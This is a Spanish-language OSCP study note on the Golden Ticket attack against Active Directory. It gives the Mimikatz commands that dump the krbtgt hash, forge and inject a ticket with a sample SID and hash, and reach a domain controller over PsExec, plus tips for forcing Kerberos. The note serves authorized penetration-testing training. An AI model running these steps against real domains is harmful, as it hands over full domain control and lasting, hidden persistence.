---
tipo: tecnica
fase: post-explotacion
so: windows
tags: [oscp, tecnica, ad, post-explotacion, persistencia, windows]
---

# Golden Ticket

> [!abstract] Qué es y cuándo usarla
> Con el **hash NTLM de la cuenta krbtgt** (secreto del KDC) se forja un **TGT arbitrario** poniéndote en **Domain Admins** / cualquier grupo. Da acceso a **todo** el dominio y es una **persistencia** potente porque el password de krbtgt casi nunca cambia.

## Requisitos previos
- **Hash NTLM de krbtgt** (de un DC comprometido: `lsadump::lsa /patch` / `lsadump::dcsync /user:krbtgt`, ver [[DCSync]]).
- **Domain SID** (`whoami /user`).
- Forjar/inyectar el ticket **no** requiere privilegios (ni estar en el dominio).

## Pasos
```text
# 1) Obtener krbtgt (en el DC, como Domain Admin)
privilege::debug
lsadump::lsa /patch                  # o lsadump::dcsync /user:corp\krbtgt
```
```text
# 2) Forjar e inyectar (en cualquier host)
kerberos::purge                      # limpiar tickets previos
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd                            # abre un cmd desde Mimikatz
```
```powershell
PsExec.exe \\dc1 cmd.exe             # por HOSTNAME = Kerberos -> acceso ; por IP = NTLM -> denegado
whoami /groups                       # Domain Admins, Enterprise Admins...
```

> [!tip] **Golden vs Silver**: golden usa el hash de **krbtgt** → TGT → **todo el dominio**; silver usa el hash del **SPN** → TGS → **un servicio** (ver [[Silver Ticket]]).

> [!warning] Detección / problemas
> - Post jul-2022: el `/user:` debe ser una cuenta **existente**.
> - Conecta siempre por **hostname** para forzar Kerberos (por IP cae a NTLM y falla).
> - Guarda/protege el hash de krbtgt: da acceso ilimitado. Pide permiso al cliente antes de usarlo.

## Visto en
- Módulo: [[24 - Lateral Movement in Active Directory]]
- Máquinas: [[]]
